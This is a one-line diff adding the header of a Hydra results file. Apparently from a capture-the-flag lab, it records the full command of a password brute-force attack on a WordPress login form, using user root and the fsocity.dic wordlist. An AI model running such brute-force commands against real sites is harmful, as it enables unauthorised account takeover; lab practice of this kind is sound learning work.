@@ -1,0 +1,1 @@
+# Hydra v9.1 run at 2021-01-01 12:37:30 on 10.10.31.57 http-post-form (hydra -l root -P fsocity.dic -s 80 -o hydra-http-post-form-attack.txt 10.10.31.57 http-post-form /wp-login.php:log=^USER^&pwd=^PASS^:ERROR)
